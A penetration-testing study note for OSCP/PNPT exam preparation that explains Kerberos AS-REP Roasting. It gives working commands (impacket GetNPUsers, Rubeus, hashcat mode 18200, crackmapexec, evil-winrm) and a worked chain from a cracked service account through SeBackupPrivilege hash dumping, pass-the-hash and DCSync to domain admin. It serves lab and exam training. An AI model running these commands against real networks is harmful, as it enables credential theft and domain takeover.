---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, asrep-roasting, kerberos]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.3 — Kerberos Attacks"]
netgod-refs: []
---

# S3-04 — AS-REP Roasting

## What Kerberos Pre-Authentication Is

In standard Kerberos, when a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Centre (KDC), the client must first prove it knows the user's password. It does this by encrypting a timestamp with the user's password hash and sending it to the KDC. This is **pre-authentication**.

**Standard Kerberos AS exchange (with pre-auth):**
```
Client → KDC:  AS-REQ {
                  Username: jsmith
                  Encrypted timestamp: Encrypt(timestamp, NTLM_hash_of_password)
               }

KDC:           Looks up jsmith's hash in NTDS.dit
               Decrypts the timestamp → validates it
               If valid: issues TGT

KDC → Client:  AS-REP {
                  TGT: Encrypt(session_key, krbtgt_hash)       ← not crackable without krbtgt
                  Session key: Encrypt(session_key, user_hash) ← encrypted with user's hash
               }
```

The session key portion of the AS-REP is encrypted with the **user's own NT hash**. The client decrypts it with their password to get the session key. An attacker without the password can't use it.

---

## Why Disabling Pre-Authentication Is Dangerous

The `DONT_REQUIRE_PREAUTH` flag on a user account tells the KDC: "Issue a TGT for this user without verifying they know their password first."

**AS exchange without pre-auth:**
```
Client → KDC:  AS-REQ {
                  Username: jsmith
                  (no encrypted timestamp — no proof of identity)
               }

KDC:           "OK, I'll just send a TGT without verification"

KDC → Client:  AS-REP {
                  TGT: Encrypt(session_key, krbtgt_hash)
                  Session key: Encrypt(session_key, jsmith_NT_hash) ← THIS IS CRACKABLE
               }
```

The KDC sends back the session key encrypted with jsmith's NT hash — **without requiring jsmith to prove who they are**. Any domain user (or even an unauthenticated attacker with a valid username) can request this response. The encrypted blob can then be cracked offline.

**Why this setting exists:** Some legacy applications and services (older Oracle, certain SAP modules, some custom software) don't support Kerberos pre-authentication. Admins disable it for service accounts to maintain compatibility.

**Attack relevance:** DONT_REQUIRE_PREAUTH accounts are AS-REP Roastable — you get their password hash without any credentials, just a username. If the account has a weak password, you crack it and use it. If it's a service account with domain privileges, that's often a path to DA.

---

## Finding AS-REP Roastable Accounts

### With Credentials (from Kali — impacket)

```bash
# Get all AS-REP roastable accounts:
impacket-GetNPUsers domain.local/user:password -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

# Without outputfile (print to screen):
impacket-GetNPUsers domain.local/user:password -dc-ip DC_IP -request

# With NTLM hash instead of password:
impacket-GetNPUsers domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP -request -format hashcat

# Flags:
# -request     = actually request the AS-REP (not just check who's vulnerable)
# -format      = output format for the hash (hashcat or john)
# -outputfile  = save hashes to file
# -dc-ip       = domain controller IP
```

**Output:**
```
$krb5asrep$23$svc_backup@DOMAIN.LOCAL:1a2b3c4d5e6f...long_hash_string...
$krb5asrep$23$jsmith@DOMAIN.LOCAL:7f8e9d0c1b2a...another_hash...
```

### Without Credentials (just a username list)

```bash
# Supply username list, no password:
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -no-pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# The tool tries each username — those with DONT_REQUIRE_PREAUTH return a hash
# Those without return: "User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set"
```

### Via CrackMapExec

```bash
crackmapexec ldap DC_IP -u user -p pass --asreproast asrep.txt
crackmapexec ldap DC_IP -u user -p pass --asreproast asrep.txt -k   # Kerberos auth
```

### Via PowerView (on Windows target)

```powershell
# Find users with DONT_REQUIRE_PREAUTH:
Get-NetUser -PreauthNotRequired | select samaccountname, userprincipalname

# Or using AD module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | select SamAccountName
```

### Via BloodHound

```
Pre-built query: "Find AS-REP Roastable Users (DontReqPreAuth)"
→ Shows all accounts with pre-auth disabled and their attack paths
```

### Via Rubeus (on Windows target)

```powershell
# Transfer Rubeus.exe to target, then:
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# For a specific user:
.\Rubeus.exe asreproast /user:jsmith /format:hashcat

# For all vulnerable users with statistics:
.\Rubeus.exe asreproast /stats
```

---

## The Hash Format — What You're Cracking

AS-REP hashes use RC4 encryption by default (type 23 in Kerberos terminology):

```
$krb5asrep$23$username@DOMAIN.LOCAL:NONCE$HASH
```

Breaking it down:
- `$krb5asrep$` — identifier: this is a Kerberos AS-REP hash
- `23` — encryption type: 23 = RC4-HMAC (crackable), 17/18 = AES (harder to crack)
- `username@DOMAIN.LOCAL` — the target account
- `NONCE` — the random server nonce
- `HASH` — the actual encrypted data containing the session key

**Why RC4 (type 23)?**
Older domain configurations use RC4 by default. Modern AD can be configured for AES-only (types 17 and 18), which is significantly harder to crack. Check if you can request RC4 specifically:

```bash
# Force RC4 (type 23) — most crackable:
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request -format hashcat
# Impacket requests RC4 by default

# Rubeus — request specific encryption type:
.\Rubeus.exe asreproast /user:jsmith /enctype:rc4
```

---

## Cracking AS-REP Hashes

### hashcat

```bash
# hashcat mode 18200 = Kerberos AS-REP etype 23:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# With rules (highly recommended):
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Check for cracked results:
hashcat -m 18200 asrep.txt --show

# If hash contains the username (default impacket format), strip it first or use --username:
hashcat -m 18200 asrep.txt rockyou.txt --username
```

### John the Ripper

```bash
# Ensure format is john-compatible:
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request -format john -outputfile asrep_john.txt

john asrep_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
john asrep_john.txt --show
```

### What to Do When Cracking Fails

If rockyou.txt doesn't crack it, try in this order:

```bash
# 1 — Add mutation rules:
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
hashcat -m 18200 asrep.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# 2 — Corporate wordlist (company name + year variations):
hashcat -m 18200 asrep.txt corporate_wordlist.txt

# 3 — CeWL wordlist from company website:
cewl https://company.com -d 3 -m 5 -w company_words.txt
hashcat -m 18200 asrep.txt company_words.txt -r best64.rule

# 4 — Targeted mask (if you know the password policy):
# e.g., 8+ chars, must have uppercase, lowercase, number:
hashcat -m 18200 asrep.txt -a 3 ?u?l?l?l?l?l?d?d

# 5 — Hybrid wordlist + mask:
hashcat -m 18200 asrep.txt -a 6 rockyou.txt ?d?d?d?d
```

---

## What to Do With a Cracked Password

Once you crack the AS-REP hash and have the account's plaintext password:

**Step 1 — Identify what access the account has:**
```bash
# Check group memberships:
crackmapexec smb DC_IP -u cracked_user -p cracked_pass --groups
net group "Domain Admins" /domain    # Is this account a DA?

# Check local admin access across the domain:
crackmapexec smb 192.168.0.0/24 -u cracked_user -p cracked_pass --continue-on-success
# Look for (Pwn3d!) — where does this account have admin?

# BloodHound — mark as owned, find attack paths:
# Right-click cracked user → Mark as Owned
# "Shortest paths from owned principals to Domain Admins"
```

**Step 2 — Try to use access:**
```bash
# If account has local admin somewhere:
evil-winrm -i TARGET -u cracked_user -p cracked_pass
impacket-psexec domain/cracked_user:cracked_pass@TARGET

# If account is in Domain Admins:
impacket-secretsdump domain/cracked_user:cracked_pass@DC_IP
impacket-psexec domain/cracked_user:cracked_pass@DC_IP

# If account has interesting ACLs (from BloodHound):
# Follow the attack path shown (GenericAll → reset target password, etc.)
```

**Step 3 — Credential reuse across all services:**
```bash
# Try password on all discovered machines:
crackmapexec smb 192.168.0.0/24 -u cracked_user -p cracked_pass --continue-on-success
crackmapexec winrm 192.168.0.0/24 -u cracked_user -p cracked_pass

# Try on web applications, databases, VPNs:
mysql -h TARGET -u cracked_user -p'cracked_pass'
impacket-mssqlclient domain/cracked_user:cracked_pass@TARGET
```

---

## OSCP and PNPT Exam Context

**Always check AS-REP Roasting on every AD target.** It takes 30 seconds and sometimes gives you a cracked service account password that's the entire path to DA.

**OSCP exam — specific relevance:**
- The AD set commonly has one AS-REP roastable account in the attack chain
- Service accounts are the most common targets (svc_backup, svc_mssql, svc_web)
- Cracked service account → check BloodHound for its attack paths

**PNPT exam:**
- Part of the TCM Security PEH curriculum — will appear in the 5-day exam
- Often chained: LLMNR capture → credentials → AS-REP roast more accounts → crack → DA

**Time budget:**
- Running GetNPUsers: 30 seconds
- Hashcat with rockyou.txt (GPU): 1–5 minutes for common passwords
- Hashcat with rockyou.txt (CPU only): 10–60 minutes
- If not cracked in 30 minutes: move on and crack in background

**OSCP rule:** GetNPUsers is an impacket tool, not Metasploit — no restriction. Use freely.

---

## Scenario — Full AS-REP Roasting Chain

This is what the full attack looks like from start to DA:

```bash
# 1. Enumerate domain (have domain user creds):
impacket-GetNPUsers domain.local/jsmith:Password1 -dc-ip 10.10.10.1 -request -format hashcat -outputfile asrep.txt

# 2. Found: svc_backup@domain.local is AS-REP roastable
# Hash: $krb5asrep$23$svc_backup@DOMAIN.LOCAL:AAAA...

# 3. Crack hash:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Cracked: svc_backup:Backup2019!

# 4. Check access:
crackmapexec smb 10.10.10.0/24 -u svc_backup -p Backup2019! --continue-on-success
# No (Pwn3d!) anywhere — not local admin

# 5. Check BloodHound:
# svc_backup is member of "Backup Operators" group
# Backup Operators can log on locally to DCs and read any file
# Attack path: svc_backup → Backup Operators → dump SAM+SYSTEM via SeBackupPrivilege

# 6. Connect to DC:
evil-winrm -i 10.10.10.1 -u svc_backup -p Backup2019!

# 7. Exploit SeBackupPrivilege:
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# 8. Transfer and extract hashes:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 9. Pass-the-Hash with Administrator:
impacket-psexec domain/Administrator@10.10.10.1 -hashes :ADMIN_NTLM_HASH

# 10. DCSync — get all hashes:
impacket-secretsdump domain/Administrator@10.10.10.1 -hashes :HASH
```

---

## Quick Reference

```bash
# Find AS-REP roastable users (with creds):
impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt

# Find AS-REP roastable users (no creds — need username list):
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# CME method:
crackmapexec ldap DC_IP -u user -p pass --asreproast asrep.txt

# PowerView (on Windows):
Get-NetUser -PreauthNotRequired | select samaccountname

# Rubeus (on Windows):
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule

# Crack with john:
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked:
hashcat -m 18200 asrep.txt --show

# After cracking — check access:
crackmapexec smb 192.168.0.0/24 -u cracked_user -p cracked_pass --continue-on-success
evil-winrm -i TARGET -u cracked_user -p cracked_pass
```

---

## Common Mistakes

> [!warning] AS-REP Roasting mistakes
> 1. **Not requesting the hash — only checking for vulnerability.** `impacket-GetNPUsers` without `-request` just tells you who's vulnerable but doesn't give you the hash. Always include `-request`.
> 2. **Using `-format john` then trying to crack with hashcat (or vice versa).** The hash format is slightly different between john and hashcat. Match format to tool.
> 3. **Only trying rockyou.txt without rules.** Service accounts often have slightly stronger passwords — not in rockyou.txt raw but cracked with `best64.rule` mutations. Always add rules.
> 4. **Forgetting to check BloodHound after cracking.** "svc_backup has a cracked password but isn't admin anywhere" is not the end. Check BloodHound — the account may have GenericAll on another account, or be in a group with dangerous rights.
> 5. **Not trying the cracked password on everything.** Password reuse is endemic. Try it on all SMB, WinRM, web apps, databases, VPNs — everywhere.
> 6. **Confusing AS-REP Roasting with Kerberoasting.** AS-REP = no pre-auth → get hash without credentials. Kerberoasting = request TGS for SPN → get hash with credentials. Both crack offline but different conditions apply.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Attacktive Directory" | AS-REP roasting is part of the attack chain |
| HTB — Forest | AS-REP roasting → svc-alfresco → WriteDACL → DA |
| HTB — Sauna | AS-REP roasting → fsmith → BloodHound path → DCSync |
| TCM Security — PEH Course | Full AS-REP Roasting demo with lab |
| PortSwigger — N/A | Not a web vulnerability — lab in AD environments only |
| [[PHANTOM/MODULE 4 — Active Directory/04.3 — Kerberos Attacks]] | Full technical depth in PHANTOM vault |
